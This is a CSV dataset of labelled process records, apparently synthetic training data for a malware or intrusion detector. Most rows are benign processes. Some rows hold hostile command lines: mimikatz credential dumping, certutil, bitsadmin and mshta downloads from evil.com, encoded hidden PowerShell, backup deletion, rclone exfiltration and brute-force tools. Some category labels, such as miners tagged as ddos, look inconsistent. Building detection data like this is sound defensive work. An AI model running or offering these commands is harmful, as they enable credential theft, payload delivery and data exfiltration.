process_name,cmdline,cpu_usage,memory_usage,has_network,connections,is_system_user,label,source,severity
ssh-agent.exe,ssh-agent.exe,13.265416349498109,3.820280333634421,0,3,0,normal,synthetic_normal,
obs64.exe,obs64.exe,10.456459024430767,3.8209422680471254,0,7,0,normal,synthetic_normal,
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,49.77381118670014,19.283318080079084,0,4,0,credential_dumping,mitre_credential_dumping,critical
wslhost.exe,wslhost.exe,5.220724670701754,1.285343888556473,0,8,0,normal,synthetic_normal,
explorer.exe,explorer.exe,12.509619997139094,7.698810203701854,0,4,0,normal,synthetic_normal,
wbadmin.exe,wbadmin.exe delete catalog -quiet,44.85467707610455,8.608240703710823,0,2,0,ransomware,mitre_ransomware,critical
svchost.exe,svchost.exe,21.299122372271018,4.67853661125669,0,18,1,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,27.935163137836437,0.6471941487468381,0,7,0,normal,synthetic_normal,
remcos.exe,remcos.exe --silent,55.210313510101116,33.13653582041597,1,11,0,malware,known_malware,
slowloris.py,python slowloris.py target.com,98.03420530207478,34.09432154271808,1,718,0,ddos,ddos_tools,
SenseIR.exe,SenseIR.exe,17.29572802886122,0.5640950641540092,1,4,0,normal,synthetic_normal,
rustc.exe,rustc.exe,24.787485706247256,5.199534633221118,0,5,0,normal,synthetic_normal,
MsSense.exe,MsSense.exe,24.275404366822414,4.12929038841671,0,6,0,normal,synthetic_normal,
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt -M ssh,44.25190458980131,10.00426678821632,1,173,0,brute_force,brute_force_tools,
EXCEL.EXE,EXCEL.EXE,13.860694842211615,2.9158984872549745,0,5,0,normal,synthetic_normal,
gpg.exe,gpg.exe,7.160694616857564,0.6928352231390645,0,7,0,normal,synthetic_normal,
csrss.exe,csrss.exe,23.94415045531395,6.45918291992541,0,3,0,normal,synthetic_normal,
ConEmuC.exe,ConEmuC.exe,27.00211159142525,4.466736431878193,0,12,0,normal,synthetic_normal,
Spotify.exe,Spotify.exe,9.466981022445758,4.077280228958531,0,13,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,16.92557386802169,7.25596074922128,0,11,0,normal,synthetic_normal,
powershell.exe,powershell.exe,6.584420095905889,7.036937464501198,0,18,0,normal,synthetic_normal,
redis-server.exe,redis-server.exe,23.287522065173476,5.251989183451359,1,17,0,normal,synthetic_normal,
SearchUI.exe,SearchUI.exe,15.22949065044748,3.471961137802342,0,19,0,normal,synthetic_normal,
javaw.exe,javaw.exe,18.44508818873872,0.7102255312704802,0,8,0,normal,synthetic_normal,
ninja.exe,ninja.exe,13.753640342431503,2.3476356663884306,1,7,0,normal,synthetic_normal,
NisSrv.exe,NisSrv.exe,11.8331076291044,2.956790982951459,0,19,0,normal,synthetic_normal,
bfgminer.exe,bfgminer.exe --silent,85.32443925195204,30.865727432176143,1,16,0,ddos,known_malware,
bcdedit.exe,bcdedit.exe /set {default} recoveryenabled no,77.0070548751892,24.52459374803061,1,5,0,ransomware,mitre_ransomware,high
rar.exe,rar.exe a -hp archive.rar C:\Data,36.02266096185778,19.057902661995456,1,6,0,data_exfiltration,mitre_data_exfiltration,medium
NisSrv.exe,NisSrv.exe,6.382263080482712,1.539145007790046,1,2,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,21.09485065008818,5.898048956262027,0,2,0,normal,synthetic_normal,
brave.exe,brave.exe,23.297906745155736,7.693555124368128,1,17,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,11.916086788508553,6.1349939560000815,1,1,0,normal,synthetic_normal,
Discord.exe,Discord.exe,15.593383298351716,0.5175514589378523,0,16,0,normal,synthetic_normal,
Code.exe,Code.exe,10.788065817889827,3.775691072480891,1,20,0,normal,synthetic_normal,
cmake.exe,cmake.exe,8.89993355645476,6.776399095535973,1,3,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,12.994307802665544,2.2950950231004588,0,5,0,normal,synthetic_normal,
powershell.exe,powershell.exe -ep bypass -file malware.ps1,58.82372035824039,23.20820175990969,0,7,0,malware,mitre_malicious_scripts,high
phoenixminer.exe,phoenixminer.exe --silent,83.60293030246532,14.957759398917513,1,9,0,ddos,known_malware,
mydoom.exe,mydoom.exe --silent,40.46058036464106,23.706739818819138,1,8,0,malware,known_malware,
powershell.exe,powershell.exe -nop -w hidden -enc,34.04511117263829,14.101032095673467,0,1,0,malware,mitre_malicious_scripts,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,92.9839421402988,38.892607095982726,1,1164,0,ddos,ddos_tools,
TrustedInstaller.exe,TrustedInstaller.exe,12.702561730867961,2.8404313921140596,0,19,0,normal,synthetic_normal,
certutil.exe,certutil.exe -decode encoded.txt malware.exe,61.01200054242773,10.859492624853466,1,6,0,malware,mitre_download_execute,high
SecurityHealthService.exe,SecurityHealthService.exe,21.526855194945313,4.5095703002336025,0,11,0,normal,synthetic_normal,
mongod.exe,mongod.exe,13.18250776218302,0.9200614825747967,1,13,0,normal,synthetic_normal,
python3.12.exe,python3.12.exe,9.341009742531538,7.457405739613927,0,11,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,14.985713165040314,5.092529543387226,0,10,0,normal,synthetic_normal,
hoic.exe,hoic.exe,83.68712202822732,28.779428190323397,1,543,0,ddos,ddos_tools,
git-remote-https.exe,git-remote-https.exe,15.543686742365297,3.563117288927675,0,8,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,93.20473485095118,20.339709501567427,1,1275,0,ddos,ddos_tools,
conficker.exe,conficker.exe --silent,87.4249815466951,15.471616261381325,1,16,0,malware,known_malware,
audiodg.exe,audiodg.exe,28.576168337083097,1.1768384514620394,0,2,0,normal,synthetic_normal,
OUTLOOK.EXE,OUTLOOK.EXE,29.2032699187073,6.831871213244247,1,18,0,normal,synthetic_normal,
vite.exe,vite.exe,5.517304363713214,0.5427875843167749,0,4,0,normal,synthetic_normal,
System Idle Process,System Idle Process,98.93009854710401,0.2760211787776299,0,19,1,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,77.62671656571399,16.830735947755784,1,7,0,data_exfiltration,mitre_data_exfiltration,high
atexec.py,python atexec.py user:pass@target,70.40647578045298,13.293985389196576,1,5,0,lateral_movement,mitre_lateral_movement,high
stress.exe,stress.exe --cpu 8 --io 4,93.68518851632902,19.138026368802347,1,1857,0,ddos,ddos_tools,
megasync.exe,megasync.exe --upload C:\SensitiveData,23.130504255393983,12.947456783204673,1,5,0,data_exfiltration,mitre_data_exfiltration,high
idea64.exe,idea64.exe,14.702277218995896,6.181168425480503,0,16,0,normal,synthetic_normal,
svchost.exe,svchost.exe,0.32452754664488936,1.2364521802466308,0,10,1,normal,synthetic_normal,
rustc.exe,rustc.exe,10.00021182627892,6.031944958661301,0,1,0,normal,synthetic_normal,
crowbar.exe,crowbar.exe -b rdp -s 192.168.1.0/24 -u admin -C pass.txt,42.92260856646672,14.0841100442775,1,81,0,brute_force,brute_force_tools,
pythonw.exe,pythonw.exe,8.482596300065614,2.506257189076135,1,3,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,14.5888718540373,2.410892576952487,1,20,0,normal,synthetic_normal,
bash.exe,bash.exe,2.506068556017377,3.2624904904720604,1,5,0,normal,synthetic_normal,
python3.exe,python3.exe,0.22212448463155177,1.2029101195529375,0,2,0,normal,synthetic_normal,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,77.74428050104788,24.39789485385361,0,5,0,malware,mitre_download_execute,high
hoic.exe,hoic.exe,90.98994543794,23.778584743925563,1,334,0,ddos,ddos_tools,
mshta.exe,mshta.exe http://evil.com/payload.hta,38.236818703925934,21.70552801465788,1,1,0,malware,mitre_malicious_scripts,critical
audiodg.exe,audiodg.exe,4.143170247302573,7.728320751113826,0,17,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",91.03472010704726,10.910858834021985,1,229,0,brute_force,brute_force_tools,
WINWORD.EXE,WINWORD.EXE,17.424250028997513,3.325384904651992,0,6,0,normal,synthetic_normal,
webstorm64.exe,webstorm64.exe,1.7699052799508908,5.148291135765864,1,6,0,normal,synthetic_normal,
docker.exe,docker.exe,9.924359602835185,4.454745202754522,1,11,0,normal,synthetic_normal,
npm.exe,npm.exe,12.60491761743591,1.8725954460164282,0,14,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,10.456869162363656,7.285079737987643,0,9,0,normal,synthetic_normal,
RuntimeBroker.exe,RuntimeBroker.exe,24.12478611003084,5.8089858611112435,0,3,0,normal,synthetic_normal,
zsh.exe,zsh.exe,27.521811858628425,3.153007248088536,0,15,0,normal,synthetic_normal,
hoic.exe,hoic.exe,98.5781630027237,12.065141764415756,1,1732,0,ddos,ddos_tools,
wslservice.exe,wslservice.exe,0.9433201426113169,2.9930379307120107,1,19,0,normal,synthetic_normal,
ConEmuC64.exe,ConEmuC64.exe,15.566494416671627,7.116534678010964,0,9,0,normal,synthetic_normal,
SyncThing.exe,SyncThing.exe,26.099367858509638,7.510564030556216,0,10,0,normal,synthetic_normal,
vlc.exe,vlc.exe,14.381540322177758,4.735483127327652,0,16,0,normal,synthetic_normal,
ssh-agent.exe,ssh-agent.exe,5.634622059956298,6.956109206064691,0,20,0,normal,synthetic_normal,
patator.exe,patator.exe ssh_login host=target user=admin password=FILE0,88.1132397510979,7.9737787952182,1,273,0,brute_force,brute_force_tools,
Autoruns64.exe,Autoruns64.exe,24.003463783170258,6.490734735810015,0,6,0,normal,synthetic_normal,
node.exe,node.exe,23.3344159567063,20.974343653036378,0,4,0,normal,synthetic_normal,
taskhost.exe,taskhost.exe --silent,47.81455773666276,24.041019803836143,1,16,0,malware,known_malware,
peazip.exe,peazip.exe,15.090072171244794,2.569503440718354,0,2,0,normal,synthetic_normal,
postgres.exe,postgres.exe,25.655656257614346,4.209647511287207,0,13,0,normal,synthetic_normal,
Photoshop.exe,Photoshop.exe,16.97168822597991,7.656917943017707,0,9,0,normal,synthetic_normal,
g++.exe,g++.exe,1.2441389714350293,6.4978202784973496,1,5,0,normal,synthetic_normal,
Docker Desktop.exe,Docker Desktop.exe,8.49033065016522,4.0992992251030484,0,16,0,normal,synthetic_normal,
esbuild.exe,esbuild.exe,12.753373530751697,1.2922613050007399,0,13,0,normal,synthetic_normal,
Discord.exe,Discord.exe,27.715009898187976,5.956591453785349,0,8,0,normal,synthetic_normal,
mydoom.exe,mydoom.exe --silent,83.62204855241474,36.93891586109001,1,15,0,malware,known_malware,
rustc.exe,rustc.exe,5.0011689944410564,4.998838758435491,0,18,0,normal,synthetic_normal,
certutil.exe,certutil.exe -decode encoded.txt malware.exe,72.17359806252504,20.145194240792705,1,9,0,malware,mitre_download_execute,high
wslservice.exe,wslservice.exe,13.93942455870706,7.115735972100326,1,9,0,normal,synthetic_normal,
nmap.exe,nmap.exe -sV -sC 192.168.1.0/24,49.34488187666459,18.79261811999836,0,40,0,reconnaissance,mitre_network_scanning,medium
7zFM.exe,7zFM.exe,28.002812664858965,3.255244533558762,1,19,0,normal,synthetic_normal,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",91.5429501426662,9.69310693073366,1,496,0,brute_force,brute_force_tools,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,72.16910772253786,17.03253878419175,1,204,0,brute_force,brute_force_tools,
Registry,Registry,26.70170656309348,5.97450754156079,1,5,0,normal,synthetic_normal,
mydoom.exe,mydoom.exe --silent,73.93212409469413,15.213929796636632,1,13,0,malware,known_malware,
bitsadmin.exe,bitsadmin.exe /transfer job /download http://evil.com/mal.exe,57.08104337266798,14.668328161568393,0,0,0,malware,mitre_download_execute,high
xmrig.exe,xmrig.exe -o pool.mining.com:3333 -u wallet,86.07348649701416,33.948709206291184,1,573,0,ddos,ddos_tools,
emotet.exe,emotet.exe --silent,43.884009328176674,32.92770146086683,1,6,0,malware,known_malware,
SyncThing.exe,SyncThing.exe,22.40032090829603,3.4697294347636207,0,13,0,normal,synthetic_normal,
adrecon.ps1,powershell.exe ./ADRecon.ps1,68.71351932104861,11.230889812749467,1,9,0,reconnaissance,mitre_reconnaissance,high
vite.exe,vite.exe,11.645416502855214,7.362193413954896,0,0,0,normal,synthetic_normal,
powershell.exe,powershell.exe Invoke-Mimikatz,60.91940514412266,11.805511350707953,1,0,0,malware,mitre_malicious_scripts,critical
GoogleDriveSync.exe,GoogleDriveSync.exe,12.369045354700303,5.901418809465958,0,0,0,normal,synthetic_normal,
System,System,2.4860924914735345,0.7555840899340224,0,0,1,normal,synthetic_normal,
esbuild.exe,esbuild.exe,28.89909100759101,6.400550613141797,0,9,0,normal,synthetic_normal,
SearchApp.exe,SearchApp.exe,15.290064715307231,7.510072068887331,1,6,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,79.02258843970456,22.011741421904617,1,7,0,data_exfiltration,mitre_data_exfiltration,high
atom.exe,atom.exe,9.384106775086382,7.906346885582974,0,12,0,normal,synthetic_normal,
opera.exe,opera.exe,14.562982131126804,5.203598969113307,0,12,0,normal,synthetic_normal,
ssh-add.exe,ssh-add.exe,27.316934857449535,5.394514043649809,1,1,0,normal,synthetic_normal,
docker.exe,docker.exe,0.6693240273115453,7.246552927957737,0,8,0,normal,synthetic_normal,
lsasss.exe,lsasss.exe --silent,75.23764595736827,23.52552707832089,1,1,0,trojan,known_malware,
python3.11.exe,python3.11.exe,13.06935151787585,2.4466396079824726,0,18,0,normal,synthetic_normal,
rubeus.exe,rubeus.exe asreproast,71.68741437535994,22.326916763331678,1,5,0,reconnaissance,mitre_reconnaissance,critical
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,47.97890460131855,23.333466938440534,1,1,0,data_exfiltration,mitre_data_exfiltration,critical
MpCmdRun.exe,MpCmdRun.exe,23.71888836351324,6.895165888467808,0,0,0,normal,synthetic_normal,
python.exe,python.exe,20.081583303617144,3.0347774398980425,1,16,0,normal,synthetic_normal,
Dropbox.exe,Dropbox.exe,8.733962320377868,4.795995558478222,0,0,0,normal,synthetic_normal,
avoslocker.exe,avoslocker.exe --silent,47.45412939624835,37.45335200604723,1,28,0,malware,known_malware,
slowloris.py,python slowloris.py target.com,95.0202785012463,33.38467891574763,1,1998,0,ddos,ddos_tools,
ethminer.exe,ethminer.exe --silent,43.05315954234996,13.664252446534189,1,7,0,ddos,known_malware,
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,64.69953596690658,19.573609810671,1,293,0,brute_force,brute_force_tools,
npm.exe,npm.exe,21.2496175769771,6.381390298154005,0,9,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,84.51780664503599,5.790439858204896,1,380,0,brute_force,brute_force_tools,
svhost.exe,svhost.exe --silent,63.99143539890255,23.425966456922385,1,29,0,malware,known_malware,
hoic.exe,hoic.exe,86.50948900683008,32.1808140574636,1,1614,0,ddos,ddos_tools,
vlc.exe,vlc.exe,3.8508383513332367,1.8550739740878284,0,15,0,normal,synthetic_normal,
chinachopper.exe,chinachopper.exe --silent,41.62923554934655,22.18798578401541,1,10,0,malware,known_malware,
com.docker.proxy.exe,com.docker.proxy.exe,21.081756255476567,5.032259816189978,1,16,0,normal,synthetic_normal,
WinRAR.exe,WinRAR.exe,15.258609686863077,3.8007950058843614,0,15,0,normal,synthetic_normal,
MSACCESS.EXE,MSACCESS.EXE,26.11215212432712,0.7588933357936032,1,13,0,normal,synthetic_normal,
blackcat.exe,blackcat.exe --silent,52.1121636998092,20.380875875453484,1,11,0,malware,known_malware,
Autoruns.exe,Autoruns.exe,12.980511342369187,5.068776179822412,0,19,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,87.37590987006307,33.403567031945045,1,1200,0,ddos,ddos_tools,
stress.exe,stress.exe --cpu 8 --io 4,94.55467859448545,24.303095330658117,1,1994,0,ddos,ddos_tools,
System Idle Process,System Idle Process,93.52735798104737,0.2594381471285485,0,19,1,normal,synthetic_normal,
pycharm64.exe,pycharm64.exe,15.507562443307535,7.332498321478921,1,12,0,normal,synthetic_normal,
blackcat.exe,blackcat.exe --silent,78.70211654020798,23.282179012821306,1,11,0,malware,known_malware,
ncrack.exe,"ncrack.exe -p 22,3389 -U users.txt -P pass.txt target",94.29520760717119,10.442339899491191,1,415,0,brute_force,brute_force_tools,
sharpup.exe,sharpup.exe,24.413285595086734,18.47574096450446,1,8,0,privilege_escalation,mitre_privilege_escalation,medium
cscript.exe,cscript.exe //E:jscript payload.js,67.916704856397,6.761223245186663,1,0,0,malware,mitre_malicious_scripts,medium
wget.exe,wget.exe http://evil.com/malware.exe,54.71658585151203,11.298845858261403,0,3,0,malware,mitre_download_execute,medium
csc.exe,csc.exe,20.29819154696037,5.276811907068863,0,9,0,normal,synthetic_normal,
stress.exe,stress.exe --cpu 8 --io 4,83.33485760675659,37.486631613836735,1,374,0,ddos,ddos_tools,
pwsh.exe,pwsh.exe,13.147503991342527,1.5591534732274257,0,20,0,normal,synthetic_normal,
python.exe,python.exe,92.14925557387816,31.827695521112314,0,11,0,normal,synthetic_normal,
Illustrator.exe,Illustrator.exe,23.702744281618916,4.494501545355916,0,18,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,22.884488617940313,2.747662771893095,0,16,0,normal,synthetic_normal,
NisSrv.exe,NisSrv.exe,9.576118119311566,0.5612076105052739,1,10,0,normal,synthetic_normal,
empire,launcher.bat,77.4833364647853,16.935151242375994,1,5,0,trojan,mitre_command_control,critical
spoolsv.exe,spoolsv.exe,17.97676046959839,5.660217079688919,0,16,0,normal,synthetic_normal,
pingcastle.exe,pingcastle.exe --healthcheck,73.65352581210936,9.765553249398817,1,8,0,reconnaissance,mitre_reconnaissance,medium
com.docker.service.exe,com.docker.service.exe,1.3415588759944852,5.27416633674045,0,16,0,normal,synthetic_normal,
com.docker.service.exe,com.docker.service.exe,7.641714957784064,5.688932724963227,0,20,0,normal,synthetic_normal,
rclone.exe,rclone.exe sync C:\Users\Documents mega:backup,57.42029157630317,21.94446183661141,1,5,0,data_exfiltration,mitre_data_exfiltration,high
GIMP.exe,GIMP.exe,18.493348331472156,2.4771514151306464,0,12,0,normal,synthetic_normal,
loic.exe,loic.exe --target 192.168.1.1 --port 80,83.59865366827138,14.914832319983482,1,972,0,ddos,ddos_tools,
javaw.exe,javaw.exe,8.002439812131145,3.6939450520605077,1,16,0,normal,synthetic_normal,
cryptor.exe,cryptor.exe -aes256 -all,45.48325530598007,20.31663156364885,1,6,0,ransomware,mitre_ransomware,critical
bazarloader.exe,bazarloader.exe --silent,43.28953914492255,22.26399543245698,1,20,0,malware,known_malware,
csrss.exe,csrss.exe,7.825432980870205,3.8727890547469794,0,19,0,normal,synthetic_normal,
ProcessHacker.exe,ProcessHacker.exe,8.215055920467105,1.8444275369854473,0,12,0,normal,synthetic_normal,
bash.exe,bash.exe,2.353743514578049,6.641461641860459,0,20,0,normal,synthetic_normal,
fish.exe,fish.exe,10.037229147701334,0.8619136958276805,0,0,0,normal,synthetic_normal,
hashcat.exe,hashcat.exe -m 1000 -a 0 hash.txt wordlist.txt,66.09044654278735,9.737366914602312,1,167,0,brute_force,brute_force_tools,
MpCopyAccelerator.exe,MpCopyAccelerator.exe,20.293524048803288,2.4680167957001204,0,14,0,normal,synthetic_normal,
node.exe,node.exe,63.06674087004468,20.732723436197407,1,15,0,normal,synthetic_normal,
certutil.exe,certutil.exe -urlcache -split -f http://evil.com/malware.exe,74.53746982192104,13.416375403414389,1,5,0,malware,mitre_download_execute,high
taskhostw.exe,taskhostw.exe,3.0647268272054005,1.6850455685657018,1,13,0,normal,synthetic_normal,
